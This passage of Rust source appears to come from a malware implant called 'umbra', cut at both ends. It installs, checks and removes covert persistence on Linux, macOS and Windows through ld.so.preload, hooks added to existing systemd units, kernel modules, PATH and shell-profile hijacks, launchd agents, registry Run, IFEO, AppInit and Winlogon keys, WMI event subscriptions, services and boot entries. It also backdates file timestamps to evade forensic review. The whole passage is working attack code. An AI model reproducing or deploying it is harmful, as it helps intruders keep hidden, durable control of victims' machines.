                }
                fs::write(&path, text.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            }
            Ok((path.to_string_lossy().to_string(), "written".to_string()))
        }
        "profile.env" => {
            // The environment source of the machine: the directory of the
            // implant joins the PATH, so the program is found by its name.
            let path = PathBuf::from("/etc/profile");
            let marker = format!("# {name}");
            let dir = Path::new(staged)
                .parent()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|| "/tmp".to_string());
            let mut text = fs::read_to_string(&path).unwrap_or_default();
            if !text.contains(&marker) {
                text.push_str(&format!("\n{marker}\nexport PATH=\"{dir}:$PATH\"\n"));
                fs::write(&path, text.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            }
            Ok((
                path.to_string_lossy().to_string(),
                format!("the path of the session starts in {dir}"),
            ))
        }
        "ld_preload" => {
            let path = PathBuf::from("/etc/ld.so.preload");
            let mut text = fs::read_to_string(&path).unwrap_or_default();
            if !text.contains(staged) {
                if !text.is_empty() && !text.ends_with('\n') {
                    text.push('\n');
                }
                text.push_str(&format!("{staged}\n"));
                fs::write(&path, text.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            }
            Ok((path.to_string_lossy().to_string(), "written".to_string()))
        }
        "xdg_autostart" => {
            let path = home().join(".config/autostart").join(format!("{}.desktop", sanitise(name)));
            let definition = format!(
                "[Desktop Entry]\nType=Application\nName={name}\nExec={staged}\nX-GNOME-Autostart-enabled=true\n"
            );
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
            }
            fs::write(&path, definition.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            Ok((path.to_string_lossy().to_string(), "written".to_string()))
        }
        "at" => {
            let output = run(&format!("echo {staged} | at now + 1 minute"));
            Ok(("at".to_string(), format!("at: {output}")))
        }
        "profile.alias" => {
            // The implant hides behind a command the operator types: the
            // shell calls the wrapper, and the wrapper calls the implant.
            let path = home().join(".bashrc");
            let mut text = fs::read_to_string(&path).unwrap_or_default();
            let marker = format!("# umbra:{name}");
            if !text.contains(&marker) {
                let wrapper = format!("\n{marker}\numbra() {{ {staged} \"$@\"; }}\n");
                text.push_str(&wrapper);
                fs::write(&path, text.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            }
            Ok((
                path.to_string_lossy().to_string(),
                "the wrapper is in the profile".to_string(),
            ))
        }
        "systemd.execstartpre" => {
            // The implant does not get a unit of its own: it is added to a
            // unit that already exists, as a step before the real work.
            let unit = args.str_or("unit", "");
            if unit.is_empty() {
                return Err(
                    "systemd.execstartpre needs args.unit (the service to hook into)".to_string(),
                );
            }
            let dir = PathBuf::from("/etc/systemd/system").join(format!("{}.d", unit));
            fs::create_dir_all(&dir).map_err(|e| format!("persist: {e}"))?;
            let path = dir.join("umbra.conf");
            let definition = format!("[Unit]\nExecStartPre={staged}\n");
            fs::write(&path, definition.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            let output = run("systemctl daemon-reload");
            Ok((
                path.to_string_lossy().to_string(),
                format!("systemctl: {output}"),
            ))
        }
        "kernel.module" => {
            // The loudest technique there is: the implant runs inside the
            // kernel, and the module is loaded again at every boot.
            let module = args.str_or("module", "");
            if module.is_empty() {
                return Err("kernel.module needs args.module (the .ko file)".to_string());
            }
            let file = Path::new(&module)
                .file_name()
                .map(|f| f.to_string_lossy().to_string())
                .unwrap_or_else(|| "umbra.ko".to_string());
            let dir = PathBuf::from("/lib/modules").join(kernel_release()).join("extra");
            fs::create_dir_all(&dir).map_err(|e| format!("persist: {e}"))?;
            let target = dir.join(&file);
            fs::copy(&module, &target).map_err(|e| format!("persist: {e}"))?;
            let load = PathBuf::from("/etc/modules-load.d").join(format!("{}.conf", sanitise(name)));
            if let Some(parent) = load.parent() {
                fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
            }
            fs::write(&load, format!("{file}\n").as_bytes()).map_err(|e| format!("persist: {e}"))?;
            let output = run(&format!("modprobe {}", file.trim_end_matches(".ko")));
            Ok((
                target.to_string_lossy().to_string(),
                format!("modprobe: {output}"),
            ))
        }
        // ---- macOS -----------------------------------------------------
        "launchd.agent" => {
            let path = home()
                .join("Library/LaunchAgents")
                .join(format!("io.umbra.{}.plist", sanitise(name)));
            write_plist(&path, name, staged)?;
            let output = run(&format!("launchctl load -w {}", path.display()));
            Ok((path.to_string_lossy().to_string(), format!("launchctl: {output}")))
        }
        "launchd.daemon" => {
            let path = PathBuf::from("/Library/LaunchDaemons")
                .join(format!("io.umbra.{}.plist", sanitise(name)));
            write_plist(&path, name, staged)?;
            let output = run(&format!("launchctl load -w {}", path.display()));
            Ok((path.to_string_lossy().to_string(), format!("launchctl: {output}")))
        }
        "loginitem" => {
            let path = home()
                .join("Library/LaunchAgents")
                .join(format!("io.umbra.{}.plist", sanitise(name)));
            write_plist(&path, name, staged)?;
            Ok((path.to_string_lossy().to_string(), "written".to_string()))
        }
        "shell_rc" => {
            let path = home().join(".zshrc");
            let mut text = fs::read_to_string(&path).unwrap_or_default();
            let marker = format!("# {name}");
            if !text.contains(&marker) {
                text.push_str(&format!("\n{marker}\n{staged} >/dev/null 2>&1 &\n"));
                fs::write(&path, text.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            }
            Ok((path.to_string_lossy().to_string(), "written".to_string()))
        }
        other => Err(format!("{other} is not a technique this build can install")),
    }
}

/// Remove one technique. Returns what was removed.
fn remove_technique(
    id: &str,
    name: &str,
    location: &str,
    detail: &str,
    binary: &str,
) -> Result<Vec<String>, String> {
    match id {
        "registry.run" => registry_del("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run", name),
        "registry.runonce" => registry_del("HKCU", r"Software\Microsoft\Windows\CurrentVersion\RunOnce", name),
        "registry.explorer_run" => registry_del("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Explorer\Run", name),
        "registry.winlogon" => registry_del("HKLM", r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit"),
        "registry.ifeo" => registry_del("HKLM", r"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", "Debugger"),
        "registry.appinit" => registry_del("HKLM", r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "AppInit_DLLs"),
        "registry.com" => registry_del("HKCU", r"Software\Classes\CLSID\{00000000-0000-0000-0000-00000000umbra}\InprocServer32", ""),
        "registry.printmonitor" => registry_del("HKLM", r"SYSTEM\CurrentControlSet\Control\Print\Monitors\umbra\1", "Driver"),
        "registry.shell_ext" => registry_del("HKCU", r"Software\Classes\.umbra\ShellExtension\Handler", ""),
        "schtasks" => {
            let output = run(&format!("schtasks /Delete /TN \"{name}\" /F"));
            Ok(vec![format!("schtasks: {output}")])
        }
        "taskxml" => {
            let output = run(&format!("schtasks /Delete /TN \"{name}\" /F"));
            let _ = fs::remove_file(home().join(".umbra").join("task.xml"));
            Ok(vec![format!("schtasks: {output}")])
        }
        "service" => {
            // The service may have been installed under another name.
            let service = service_name(detail, name);
            remove_service(&service)
        }
        "startup" => {
            let path = PathBuf::from(location);
            match fs::remove_file(&path) {
                Ok(()) => Ok(vec![format!("removed {}", path.display())]),
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                    Ok(vec![format!("{} was already gone", path.display())])
                }
                Err(e) => Err(e.to_string()),
            }
        }
        "bcdedit" => {
            let output = run("bcdedit /deletevalue {default} bootexecute");
            Ok(vec![format!("bcdedit: {output}")])
        }
        "wmi.event" => {
            // The three objects go in the opposite order of the install:
            // the binding first, then the consumer, then the filter.
            let mut parts = location.splitn(2, ':');
            let namespace = parts.next().unwrap_or("root\\subscription");
            let consumer = parts.next().unwrap_or(name);
            let binding = format!(
                "wmic /namespace:{namespace} PATH __FilterToConsumerBinding WHERE Filter=\"{namespace}:__EventFilter.Name=\\\"{name}\\\"\" DELETE"
            );
            let consumer_cmd = format!(
                "wmic /namespace:{namespace} PATH CommandLineEventConsumer WHERE Name=\"{consumer}\" DELETE"
            );
            let filter = format!(
                "wmic /namespace:{namespace} PATH __EventFilter WHERE Name=\"{name}\" DELETE"
            );
            Ok(vec![
                format!("wmic: {}", run(&binding)),
                format!("wmic: {}", run(&consumer_cmd)),
                format!("wmic: {}", run(&filter)),
            ])
        }
        "dll.searchorder" => {
            let path = PathBuf::from(location);
            match fs::remove_file(&path) {
                Ok(()) => Ok(vec![format!("removed {}", path.display())]),
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                    Ok(vec![format!("{} was already gone", path.display())])
                }
                Err(e) => Err(e.to_string()),
            }
        }
        "service.dll" => registry_del("HKLM", location, "ServiceDll"),
        "systemd.user" | "systemd.system" | "systemd.timer" => {
            let output = run(&format!("systemctl disable --now {}", unit_name(name)));
            let path = PathBuf::from(location);
            let _ = fs::remove_file(&path);
            Ok(vec![format!("systemctl: {output}"), format!("removed {}", path.display())])
        }
        "cron.user" => {
            // The crontab line holds the path of the staged implant, so the
            // line that is removed is the one that mentions it.
            let output = run(&format!(
                "(crontab -l 2>/dev/null | grep -v -F '{binary}') | crontab -"
            ));
            Ok(vec![format!("crontab: {output}")])
        }
        "cron.d" | "rc.local" | "init.d" | "profile" | "profile.alias" | "profile.env"
        | "ld_preload" | "xdg_autostart" | "shell_rc" => {
            let path = PathBuf::from(location);
            let mut text = fs::read_to_string(&path).unwrap_or_default();
            let before = text.lines().count();
            let kept: Vec<&str> = text
                .lines()
                .filter(|line| !line.contains(binary) && !line.contains(name))
                .collect();
            let after = kept.len();
            if before != after {
                let mut out = kept.join("\n");
                if !out.is_empty() {
                    out.push('\n');
                }
                fs::write(&path, out.as_bytes()).map_err(|e| format!("persist: {e}"))?;
            }
            if id == "init.d" {
                let _ = run(&format!("update-rc.d -f {} remove", sanitise(name)));
            }
            if id == "profile" && location.contains("/etc/profile.d/") {
                // The drop-in is ours alone, so it goes away with the file.
                let _ = fs::remove_file(&path);
                return Ok(vec![format!("removed {}", path.display())]);
            }
            Ok(vec![format!("cleaned {}", path.display())])
        }
        "at" => {
            let output = run("atrm $(atq | awk '{print $1}') 2>/dev/null");
            Ok(vec![format!("at: {output}")])
        }
        "systemd.execstartpre" => {
            let path = PathBuf::from(location);
            let _ = fs::remove_file(&path);
            let output = run("systemctl daemon-reload");
            Ok(vec![
                format!("removed {}", path.display()),
                format!("systemctl: {output}"),
            ])
        }
        "kernel.module" => {
            let path = PathBuf::from(location);
            let _ = fs::remove_file(&path);
            let load = PathBuf::from("/etc/modules-load.d").join(format!("{}.conf", sanitise(name)));
            let _ = fs::remove_file(&load);
            let output = run("rmmod umbra 2>/dev/null");
            Ok(vec![
                format!("removed {}", path.display()),
                format!("modprobe: {output}"),
            ])
        }
        "launchd.agent" | "launchd.daemon" | "loginitem" => {
            let path = PathBuf::from(location);
            let _ = run(&format!("launchctl unload -w {}", path.display()));
            let _ = fs::remove_file(&path);
            Ok(vec![format!("removed {}", path.display())])
        }
        other => Err(format!("{other} is not a technique this build knows")),
    }
}

/// Check that a technique is still installed.
///
/// The check reads the artefact back: the registry value, the file, the
/// crontab line.  A technique that cannot be read is "broken", which is the
/// word the operator needs.
fn verify_technique(
    id: &str,
    name: &str,
    location: &str,
    binary: &str,
) -> Result<(String, String), String> {
    match id {
        "registry.run" => registry_check("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run", name),
        "registry.runonce" => registry_check("HKCU", r"Software\Microsoft\Windows\CurrentVersion\RunOnce", name),
        "registry.explorer_run" => registry_check("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Explorer\Run", name),
        "registry.winlogon" => registry_check("HKLM", r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit"),
        "registry.ifeo" => registry_check("HKLM", r"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", "Debugger"),
        "registry.appinit" => registry_check("HKLM", r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "AppInit_DLLs"),
        "registry.com" => registry_check("HKCU", r"Software\Classes\CLSID\{00000000-0000-0000-0000-00000000umbra}\InprocServer32", ""),
        "registry.printmonitor" => registry_check("HKLM", r"SYSTEM\CurrentControlSet\Control\Print\Monitors\umbra\1", "Driver"),
        "registry.shell_ext" => registry_check("HKCU", r"Software\Classes\.umbra\ShellExtension\Handler", ""),
        "schtasks" | "taskxml" => {
            let output = run(&format!("schtasks /Query /TN \"{location}\""));
            let lowered = output.to_lowercase();
            if lowered.contains("error") || lowered.contains("not exist") {
                Ok(("broken".to_string(), "the scheduled task is gone".to_string()))
            } else {
                Ok(("installed".to_string(), "the scheduled task is there".to_string()))
            }
        }
        "service" => {
            let output = run(&format!("sc query {location}"));
            let lowered = output.to_lowercase();
            if lowered.contains("running") || lowered.contains("stopped") {
                Ok(("installed".to_string(), "the service is there".to_string()))
            } else {
                Ok(("broken".to_string(), "the service is gone".to_string()))
            }
        }
        "startup" => {
            let path = PathBuf::from(location);
            if path.exists() {
                Ok(("installed".to_string(), path.display().to_string()))
            } else {
                Ok(("broken".to_string(), "the file in the startup folder is gone".to_string()))
            }
        }
        "bcdedit" => {
            let output = run("bcdedit /enum {current}");
            if output.contains(binary) {
                Ok(("installed".to_string(), "the boot entry is there".to_string()))
            } else {
                Ok(("broken".to_string(), "the boot entry is gone".to_string()))
            }
        }
        "wmi.event" => {
            let mut parts = location.splitn(2, ':');
            let namespace = parts.next().unwrap_or("root\\subscription");
            let consumer = parts.next().unwrap_or(name);
            let command = format!(
                "wmic /namespace:{namespace} PATH CommandLineEventConsumer WHERE Name=\"{consumer}\" get Name"
            );
            let output = run(&command);
            let lowered = output.to_lowercase();
            if lowered.contains("no instance") || lowered.contains("error") {
                Ok((
                    "broken".to_string(),
                    "the event subscription is gone".to_string(),
                ))
            } else {
                Ok((
                    "installed".to_string(),
                    "the event subscription is there".to_string(),
                ))
            }
        }
        "dll.searchorder" => {
            let path = PathBuf::from(location);
            if path.exists() {
                Ok(("installed".to_string(), path.display().to_string()))
            } else {
                Ok((
                    "broken".to_string(),
                    "the module next to the program is gone".to_string(),
                ))
            }
        }
        "service.dll" => registry_check("HKLM", location, "ServiceDll"),
        "systemd.user" | "systemd.system" | "systemd.timer" => {
            let path = PathBuf::from(location);
            if path.exists() {
                Ok(("installed".to_string(), path.display().to_string()))
            } else {
                Ok(("broken".to_string(), "the unit file is gone".to_string()))
            }
        }
        "cron.user" => {
            let output = run("crontab -l");
            if output.contains(binary) {
                Ok(("installed".to_string(), "the crontab holds the entry".to_string()))
            } else {
                Ok(("broken".to_string(), "the crontab entry is gone".to_string()))
            }
        }
        "cron.d" | "rc.local" | "init.d" | "profile" | "profile.env" | "ld_preload"
        | "xdg_autostart" | "shell_rc" => {
            let path = PathBuf::from(location);
            let present = match fs::read_to_string(&path) {
                Ok(text) => text.contains(binary) || text.contains(name),
                Err(_) => false,
            };
            if present {
                Ok(("installed".to_string(), path.display().to_string()))
            } else {
                Ok(("broken".to_string(), "the entry is gone".to_string()))
            }
        }
        "at" => {
            let output = run("atq");
            if output.trim().is_empty() {
                Ok(("broken".to_string(), "the job is gone".to_string()))
            } else {
                Ok(("installed".to_string(), "the job is queued".to_string()))
            }
        }
        "profile.alias" => {
            let path = PathBuf::from(location);
            let text = fs::read_to_string(&path).unwrap_or_default();
            if text.contains(binary) {
                Ok((
                    "installed".to_string(),
                    "the wrapper is in the profile".to_string(),
                ))
            } else {
                Ok((
                    "broken".to_string(),
                    "the wrapper is gone from the profile".to_string(),
                ))
            }
        }
        "systemd.execstartpre" => {
            let path = PathBuf::from(location);
            if path.exists() {
                Ok(("installed".to_string(), path.display().to_string()))
            } else {
                Ok((
                    "broken".to_string(),
                    "the drop-in of the unit is gone".to_string(),
                ))
            }
        }
        "kernel.module" => {
            let path = PathBuf::from(location);
            if path.exists() {
                Ok(("installed".to_string(), path.display().to_string()))
            } else {
                Ok((
                    "broken".to_string(),
                    "the module is gone".to_string(),
                ))
            }
        }
        "launchd.agent" | "launchd.daemon" | "loginitem" => {
            let path = PathBuf::from(location);
            if path.exists() {
                Ok(("installed".to_string(), path.display().to_string()))
            } else {
                Ok(("broken".to_string(), "the launch entry is gone".to_string()))
            }
        }
        other => Err(format!("{other} is not a technique this build knows")),
    }
}

// ---------------------------------------------------------------------------
// The platform helpers
// ---------------------------------------------------------------------------

/// Write a systemd unit.
fn write_unit(path: &Path, staged: &str, system: bool) -> Result<(), String> {
    let wanted = if system {
        "multi-user.target"
    } else {
        "default.target"
    };
    let definition = format!(
        "[Unit]\nDescription=Background service\n\n[Service]\nExecStart={staged}\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy={wanted}\n"
    );
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
    }
    fs::write(path, definition.as_bytes()).map_err(|e| format!("persist: {e}"))?;
    Ok(())
}

/// Write a launchd property list.
fn write_plist(path: &Path, name: &str, staged: &str) -> Result<(), String> {
    let definition = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict><key>Label</key><string>io.umbra.{name}</string><key>ProgramArguments</key><array><string>{staged}</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>\n"
    );
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
    }
    fs::write(path, definition.as_bytes()).map_err(|e| format!("persist: {e}"))?;
    Ok(())
}

/// The systemd unit name of a label.
fn unit_name(name: &str) -> String {
    format!("{}.service", sanitise(name))
}

/// The name of the service, taken from the detail the install wrote.
///
/// The operator may install the service under another name, and the entry
/// has to be removed under that name: the detail reads "the service
/// <name> was created and started".
fn service_name(detail: &str, name: &str) -> String {
    let rest = detail.strip_prefix("the service ").unwrap_or(detail);
    match rest.split(" was ").next() {
        Some(first) if !first.is_empty() => first.to_string(),
        _ => name.to_string(),
    }
}

/// The release of the running kernel: the directory the modules of the
/// host live in.  A host that cannot say is given a name that will not
/// exist, so the copy fails instead of landing in the wrong place.
fn kernel_release() -> String {
    let mut release = String::new();
    if let Ok(text) = fs::read_to_string("/proc/sys/kernel/osrelease") {
        release = text.trim().to_string();
    }
    if release.is_empty() {
        "unknown".to_string()
    } else {
        release
    }
}

/// The startup folder of this user.
fn startup_dir() -> PathBuf {
    if cfg!(target_os = "windows") {
        let appdata = std::env::var("APPDATA").unwrap_or_default();
        PathBuf::from(appdata).join("Microsoft").join("Windows").join("Start Menu").join("Programs").join("Startup")
    } else {
        home().join(".config").join("autostart")
    }
}

/// Whether the implant runs with administrator rights.
fn is_admin() -> bool {
    #[cfg(windows)]
    {
        is_elevated()
    }
    #[cfg(not(windows))]
    {
        // On Unix the question is simpler: the effective user id.
        std::process::Command::new("id")
            .arg("-u")
            .output()
            .ok()
            .and_then(|out| String::from_utf8_lossy(&out.stdout).trim().parse::<u32>().ok())
            .map(|uid| uid == 0)
            .unwrap_or(false)
    }
}

/// Whether the process runs with administrator rights.
///
/// The token of the process carries the answer: an elevated token means the
/// implant may write to the machine-wide keys and install a service.
#[cfg(windows)]
fn is_elevated() -> bool {
    unsafe {
        let mut token: win::HANDLE = std::ptr::null_mut();
        if win::OpenProcessToken(win::GetCurrentProcess(), win::TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let mut elevation: u32 = 0;
        let mut returned: u32 = 0;
        let ok = win::GetTokenInformation(
            token,
            win::TOKEN_ELEVATION_CLASS,
            &mut elevation as *mut u32 as *mut u8,
            std::mem::size_of::<u32>() as u32,
            &mut returned,
        );
        win::CloseHandle(token);
        ok != 0 && elevation != 0
    }
}

/// Make a file look older than it is.
///
/// The creation time of a file that appeared today says more about the
/// implant than its name does.
pub fn set_older_timestamp(path: &Path) -> Result<(), String> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(path, fs::Permissions::from_mode(0o755));
    }
    #[cfg(unix)]
    {
        // The modification time is moved back a week with the touch
        // command: there is no standard library call for it, and the
        // implant must not depend on one.
        let _ = run(&format!("touch -d '7 days ago' {}", path.display()));
    }
    #[cfg(windows)]
    {
        let _ = run(&format!("powershell -NoProfile -Command \"(Get-Item '{}').CreationTime=(Get-Date).AddDays(-7)\"", path.display()));
    }
    Ok(())
}

/// Run a command and return its output.
fn run(command: &str) -> String {
    let shell = if cfg!(target_os = "windows") { "cmd.exe" } else { "/bin/sh" };
    let flag = if cfg!(target_os = "windows") { "/C" } else { "-c" };
    match std::process::Command::new(shell).arg(flag).arg(command).output() {
        Ok(out) => {
            let text = String::from_utf8_lossy(&out.stdout);
            let text = text.trim().to_string();
            if text.is_empty() {
                let err = String::from_utf8_lossy(&out.stderr);
                let err = err.trim().to_string();
                if err.is_empty() {
                    "ok".to_string()
                } else {
                    err
                }
            } else {
                text
            }
        }
        Err(e) => format!("failed: {e}"),
    }
}

// ---------------------------------------------------------------------------
// The Windows registry and the service control manager
// ---------------------------------------------------------------------------

/// Write a registry value.
#[cfg(windows)]
fn registry_set(hive: &str, key: &str, value: &str, data: &str) -> Result<(String, String), String> {
    let handle = win::open_key(hive, key, win::KEY_SET_VALUE | win::KEY_CREATE_SUB_KEY, true)
        .map_err(|e| format!("{key}: {e}"))?;
    let text = format!("{data}\0");
    let wide: Vec<u16> = text.encode_utf16().collect();
    let bytes: Vec<u8> = wide.iter().flat_map(|w| w.to_le_bytes()).collect();
    let name: Vec<u16> = value.encode_utf16().chain(std::iter::once(0)).collect();
    let status = unsafe {
        win::RegSetValueExW(
            handle,
            name.as_ptr(),
            0,
            win::REG_SZ,
            bytes.as_ptr(),
            bytes.len() as u32,
        )
    };
    unsafe { win::RegCloseKey(handle) };
    if status != 0 {
        return Err(format!("the value could not be written ({status})"));
    }
    Ok((key.to_string(), format!(r"{hive}\\{key}\\{value} = {data}")))
}

/// Delete a registry value.
#[cfg(windows)]
fn registry_del(hive: &str, key: &str, value: &str) -> Result<Vec<String>, String> {
    let handle = win::open_key(hive, key, win::KEY_SET_VALUE, false)
        .map_err(|e| format!("{key}: {e}"))?;
    let name: Vec<u16> = value.encode_utf16().chain(std::iter::once(0)).collect();
    let status = unsafe { win::RegDeleteValueW(handle, name.as_ptr()) };
    unsafe { win::RegCloseKey(handle) };
    if status != 0 {
        return Err(format!("the value could not be removed ({status})"));
    }
    Ok(vec![format!(r"removed {hive}\\{key}\\{value}")])
}

/// Read a registry value back.
#[cfg(windows)]
fn registry_check(hive: &str, key: &str, value: &str) -> Result<(String, String), String> {
    let handle = win::open_key(hive, key, win::KEY_QUERY_VALUE, false)
        .map_err(|e| format!("{key}: {e}"))?;
    let name: Vec<u16> = value.encode_utf16().chain(std::iter::once(0)).collect();
    let mut kind: u32 = 0;
    let mut size: u32 = 0;
    let status = unsafe {
        win::RegQueryValueExW(
            handle,
            name.as_ptr(),
            std::ptr::null_mut(),
            &mut kind,
            std::ptr::null_mut(),
            &mut size,
        )
    };
    if status != 0 {
        unsafe { win::RegCloseKey(handle) };
        return Ok(("broken".to_string(), "the value is gone".to_string()));
    }
    let mut data = vec![0u8; size as usize];
    let status = unsafe {
        win::RegQueryValueExW(
            handle,
            name.as_ptr(),
            std::ptr::null_mut(),
            &mut kind,
            data.as_mut_ptr(),
            &mut size,
        )
    };
    unsafe { win::RegCloseKey(handle) };
    if status != 0 {
        return Ok(("broken".to_string(), "the value could not be read".to_string()));
    }
    let words: Vec<u16> = data
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect();
    let text = String::from_utf16_lossy(&words);
    let text = text.trim_end_matches('\0').to_string();
    Ok(("installed".to_string(), text))
}

/// The registry is a Windows capability.
#[cfg(not(windows))]
fn registry_set(_hive: &str, _key: &str, _value: &str, _data: &str) -> Result<(String, String), String> {
    Err("the registry is a Windows capability".to_string())
}

/// The registry is a Windows capability.
#[cfg(not(windows))]
fn registry_del(_hive: &str, _key: &str, _value: &str) -> Result<Vec<String>, String> {
    Err("the registry is a Windows capability".to_string())
}

/// The registry is a Windows capability.
#[cfg(not(windows))]
fn registry_check(_hive: &str, _key: &str, _value: &str) -> Result<(String, String), String> {
    Err("the registry is a Windows capability".to_string())
}

/// Install a Windows service.
#[cfg(windows)]
fn install_service(service: &str, display: &str, binary: &str) -> Result<String, String> {
    let manager = unsafe { win::OpenSCManagerW(std::ptr::null(), std::ptr::null(), win::SC_MANAGER_ALL_ACCESS) };
    if manager.is_null() {
        return Err("the service control manager could not be opened (administrator rights?)".to_string());
    }
    let name: Vec<u16> = service.encode_utf16().chain(std::iter::once(0)).collect();
    let title: Vec<u16> = display.encode_utf16().chain(std::iter::once(0)).collect();
    let path: Vec<u16> = binary.encode_utf16().chain(std::iter::once(0)).collect();
    let handle = unsafe {
        win::CreateServiceW(
            manager,
            name.as_ptr(),
            title.as_ptr(),
            win::SERVICE_ALL_ACCESS,
            win::SERVICE_WIN32_OWN_PROCESS,
            win::SERVICE_AUTO_START,
            win::SERVICE_ERROR_NORMAL,
            path.as_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
        )
    };
    unsafe { win::CloseServiceHandle(manager) };
    if handle.is_null() {
        return Err("the service could not be created (administrator rights?)".to_string());
    }
    unsafe { win::StartServiceW(handle, 0, std::ptr::null()) };
    unsafe { win::CloseServiceHandle(handle) };
    Ok(format!("the service {service} was created and started"))
}

/// Remove a Windows service.
#[cfg(windows)]
fn remove_service(service: &str) -> Result<Vec<String>, String> {
    let manager = unsafe { win::OpenSCManagerW(std::ptr::null(), std::ptr::null(), win::SC_MANAGER_ALL_ACCESS) };
    if manager.is_null() {
        return Err("the service control manager could not be opened (administrator rights?)".to_string());
    }
    let name: Vec<u16> = service.encode_utf16().chain(std::iter::once(0)).collect();
    let handle = unsafe { win::OpenServiceW(manager, name.as_ptr(), win::SERVICE_ALL_ACCESS) };
    if handle.is_null() {
        unsafe { win::CloseServiceHandle(manager) };
        return Err(format!("the service {service} is not there"));
    }
    unsafe { win::DeleteService(handle) };
    unsafe { win::CloseServiceHandle(handle) };
    unsafe { win::CloseServiceHandle(manager) };
    Ok(vec![format!("removed the service {service}")])
}

/// The service control manager is a Windows capability.
#[cfg(not(windows))]
fn install_service(_service: &str, _display: &str, _binary: &str) -> Result<String, String> {
    Err("services are a Windows capability".to_string())
}

/// The service control manager is a Windows capability.
#[cfg(not(windows))]
fn remove_service(_service: &str) -> Result<Vec<String>, String> {
    Err("services are a Windows capability".to_string())
}

/// The Win32 calls the persistence manager needs.
#[cfg(windows)]
mod win {
    use std::os::raw::c_void;

    pub type HKEY = *mut c_void;
    pub type DWORD = u32;
    pub type LSTATUS = i32;
    pub type BOOL = i32;
    pub type SC_HANDLE = *mut c_void;

    pub const KEY_QUERY_VALUE: DWORD = 0x0001;
    pub const KEY_SET_VALUE: DWORD = 0x0002;
    pub const KEY_CREATE_SUB_KEY: DWORD = 0x0004;
    pub const REG_SZ: DWORD = 1;
    pub const HKEY_LOCAL_MACHINE: HKEY = 0x8000_0002u32 as HKEY;
    pub const HKEY_CURRENT_USER: HKEY = 0x8000_0001u32 as HKEY;
    pub const SC_MANAGER_ALL_ACCESS: DWORD = 0xF003F;
    pub const SERVICE_ALL_ACCESS: DWORD = 0xF01FF;
    pub const SERVICE_WIN32_OWN_PROCESS: DWORD = 0x0000_0010;
    pub const SERVICE_AUTO_START: DWORD = 0x0000_0002;
    pub const SERVICE_ERROR_NORMAL: DWORD = 0x0000_0001;

    pub type HANDLE = *mut c_void;

    pub const TOKEN_QUERY: DWORD = 0x0008;
    pub const TOKEN_ELEVATION_CLASS: i32 = 20;

    #[link(name = "kernel32")]
    extern "system" {
        pub fn GetCurrentProcess() -> HANDLE;
    }

    #[link(name = "advapi32")]
    extern "system" {
        pub fn OpenProcessToken(
            process: HANDLE,
            access: DWORD,
            token: *mut HANDLE,
        ) -> BOOL;
        pub fn GetTokenInformation(
            token: HANDLE,
            class: i32,
            information: *mut u8,
            length: DWORD,
            returned: *mut DWORD,
        ) -> BOOL;
        pub fn CloseHandle(handle: HANDLE) -> BOOL;

        pub fn RegCreateKeyExW(
            hkey: HKEY,
            subkey: *const u16,
            reserved: DWORD,
            class: *const u16,
            options: DWORD,
            sam: DWORD,
            attributes: *const c_void,
            result: *mut HKEY,
        ) -> LSTATUS;
        pub fn RegOpenKeyExW(
            hkey: HKEY,
            subkey: *const u16,
            options: DWORD,
            sam: DWORD,
            result: *mut HKEY,
        ) -> LSTATUS;
        pub fn RegSetValueExW(
            hkey: HKEY,
            name: *const u16,
            reserved: DWORD,
            kind: DWORD,
            data: *const u8,
            size: DWORD,
        ) -> LSTATUS;
        pub fn RegDeleteValueW(hkey: HKEY, name: *const u16) -> LSTATUS;
        pub fn RegQueryValueExW(
            hkey: HKEY,
            name: *const u16,
            reserved: *mut DWORD,
            kind: *mut DWORD,
            data: *mut u8,
            size: *mut DWORD,
        ) -> LSTATUS;
        pub fn RegCloseKey(hkey: HKEY) -> LSTATUS;
        pub fn OpenSCManagerW(
            machine: *const u16,
            database: *const u16,
            access: DWORD,
        ) -> SC_HANDLE;
        pub fn CreateServiceW(
            manager: SC_HANDLE,
            name: *const u16,
            display: *const u16,
            access: DWORD,
            kind: DWORD,
            start: DWORD,
            control: DWORD,
            binary: *const u16,
            group: *const u16,
            tag: *const u16,
            dependencies: *const u16,
            account: *const u16,
            password: *const u16,
        ) -> SC_HANDLE;
        pub fn OpenServiceW(
            manager: SC_HANDLE,
            name: *const u16,
            access: DWORD,
        ) -> SC_HANDLE;
        pub fn StartServiceW(
            service: SC_HANDLE,
            argc: DWORD,
            argv: *const *const u16,
        ) -> BOOL;
        pub fn DeleteService(service: SC_HANDLE) -> BOOL;
